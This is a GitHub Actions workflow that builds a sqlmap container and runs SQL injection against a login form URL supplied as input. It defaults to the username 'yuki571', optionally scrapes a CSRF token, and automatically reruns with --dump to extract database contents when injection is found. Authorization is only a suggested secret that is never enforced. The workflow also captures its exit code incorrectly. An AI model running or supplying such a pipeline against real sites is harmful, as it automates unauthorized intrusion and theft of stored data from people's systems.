name: Build sqlmap image and run (authorized targets only)

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: 'Login URL (full). If empty, will use TARGET_URL secret'
        required: false
        default: ''
      username:
        description: 'Username to test (default: yuki571)'
        required: false
        default: 'yuki571'
      use_csrf:
        description: 'true/false - whether to attempt to extract CSRF token from the login page'
        required: false
        default: 'false'
      password_placeholder:
        description: 'Placeholder password to include in POST body (sqlmap injects into parameters)'
        required: false
        default: 'placeholder'
      dump_on_find:
        description: 'true/false - if true, will append --dump when sqlmap reports injection (only for owned/test systems)'
        required: false
        default: ''

jobs:
  build-and-run:
    runs-on: ubuntu-latest
    steps:
      - name: Safety/inputs check
        id: check
        run: |
          TARGET="${{ github.event.inputs.target_url || secrets.TARGET_URL }}"
          USER="${{ github.event.inputs.username }}"
          if [ -z "$TARGET" ]; then
            echo "ERROR: TARGET URL not provided (set workflow input or TARGET_URL secret)."
            exit 1
          fi
          echo "target=$TARGET" >> $GITHUB_OUTPUT
          echo "username=$USER" >> $GITHUB_OUTPUT
          echo "use_csrf=${{ github.event.inputs.use_csrf }}" >> $GITHUB_OUTPUT
          echo "password_placeholder=${{ github.event.inputs.password_placeholder }}" >> $GITHUB_OUTPUT
          echo "dump_on_find=${{ github.event.inputs.dump_on_find || secrets.DUMP_ON_FIND }}" >> $GITHUB_OUTPUT
          if [ -z "${{ secrets.AUTH_PROOF }}" ]; then
            echo "NOTE: AUTH_PROOF not set as a secret. Recommended to set to prove authorization."
          else
            echo "AUTH_PROOF present (not shown)."
          fi

      - name: Install tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y git curl jq docker.io
          # start docker (runner usually has it, but ensure service)
          sudo systemctl start docker || true
          docker --version

      - name: Clone sqlmap upstream
        run: |
          rm -rf /tmp/sqlmap_repo
          git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /tmp/sqlmap_repo
          ls -la /tmp/sqlmap_repo | sed -n '1,120p'

      - name: Create Dockerfile (simple wrapper)
        run: |
          cat > /tmp/sqlmap_repo/Dockerfile <<'EOF'
          FROM python:3.11-slim
          WORKDIR /sqlmap
          COPY . /sqlmap
          # optional: install additional packages if needed
          RUN apt-get update && apt-get install -y --no-install-recommends git curl && \
              pip install --no-cache-dir -r requirements.txt 2>/dev/null || true
          ENTRYPOINT ["python3", "sqlmap.py"]
          EOF
          sed -n '1,120p' /tmp/sqlmap_repo/Dockerfile

      - name: Build sqlmap docker image
        run: |
          cd /tmp/sqlmap_repo
          sudo docker build -t my-sqlmap:ci .
          sudo docker images my-sqlmap:ci

      - name: (Optional) Extract CSRF token from login page
        if: ${{ github.event.inputs.use_csrf == 'true' }}
        run: |
          TARGET="${{ steps.check.outputs.target }}"
          echo "Fetching login page to try to find CSRF token..."
          curl -s -c /tmp/cookies.txt "$TARGET" -o /tmp/loginpage.html || true
          # try common patterns; adjust to your page as needed
          CSRF=$(grep -oP 'name="csrf_token" value="\K[^"]+' /tmp/loginpage.html || true)
          if [ -z "$CSRF" ]; then
            CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' /tmp/loginpage.html || true)
          fi
          if [ -z "$CSRF" ]; then
            echo "WARNING: CSRF token not auto-extracted. Dumping first 200 lines for debugging."
            sed -n '1,200p' /tmp/loginpage.html
            # we do not fail here automatically so user can inspect and adjust patterns
          else
            echo "CSRF_TOKEN=$CSRF" >> $GITHUB_ENV
            echo "COOKIE_JAR=/tmp/cookies.txt" >> $GITHUB_ENV
            echo "Extracted CSRF token (hidden)."
          fi

      - name: Run sqlmap container (non-interactive) and capture output
        env:
          TARGET: ${{ steps.check.outputs.target }}
          USERNAME: ${{ steps.check.outputs.username }}
          PASS_PLACEHOLDER: ${{ steps.check.outputs.password_placeholder }}
          CSRF_TOKEN: ${{ env.CSRF_TOKEN }}
          COOKIE_JAR: ${{ env.COOKIE_JAR }}
          DUMP_ON_FIND: ${{ steps.check.outputs.dump_on_find }}
        run: |
          set -euo pipefail
          POST="username=${USERNAME}&password=${PASS_PLACEHOLDER}"
          if [ -n "${CSRF_TOKEN:-}" ]; then
            POST="${POST}&csrf_token=${CSRF_TOKEN}"
            COOKIE_ARG="--cookie=/tmp/cookies.txt"
          else
            COOKIE_ARG=""
          fi

          echo "Running sqlmap against: $TARGET"
          echo "POST body (for logging only, token hidden if present):"
          echo "${POST}" | sed -E 's/(csrf_token=[^&]+)/csrf_token=REDACTED/'

          # Build base command; do NOT use --network host to avoid runner-specific issues.
          BASE_CMD=(docker run --rm my-sqlmap:ci --url "$TARGET" --data "$POST" --batch --level=3 --risk=2 --threads=2 --timeout=15)

          # If user requested dump-on-find, append --dump via --keep-alive trick later
          # We'll capture output into a file for artifact upload.
          LOGFILE=/tmp/sqlmap_run_output.txt
          echo "Invoking: ${BASE_CMD[*]}"
          # Execute and capture exit code but don't fail the job immediately (we want logs)
          if "${BASE_CMD[@]}" > "$LOGFILE" 2>&1; then
            echo "sqlmap finished successfully."
            EXIT_CODE=0
          else
            echo "sqlmap finished with non-zero exit (possible no injection or errors)."
            EXIT_CODE=$?
          fi

          # If dump_on_find true, try to re-run with --dump if earlier run reported injection (quick heuristic)
          if [ "${DUMP_ON_FIND:-}" = "true" ]; then
            if grep -iE "is vulnerable|parameter.*is.*vulnerable" "$LOGFILE" >/dev/null 2>&1; then
              echo "Vulnerability signature found in initial output â€” re-running with --dump (ONLY for owned systems)."
              docker run --rm my-sqlmap:ci --url "$TARGET" --data "$POST" --batch --level=3 --risk=2 --threads=2 --timeout=15 --dump >> "$LOGFILE" 2>&1 || true
            else
              echo "No clear vulnerability signature found; skipping --dump."
            fi
          fi

          # Show tail of log for quick check
          echo "===== sqlmap output (tail) ====="
          tail -n 200 "$LOGFILE" || true
          # Save log to workspace so artifact step can pick it up
          cp "$LOGFILE" /tmp/sqlmap_output_saved.txt || true
          exit $EXIT_CODE

      - name: Upload sqlmap logs as artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sqlmap-output
          path: /tmp/sqlmap_output_saved.txt
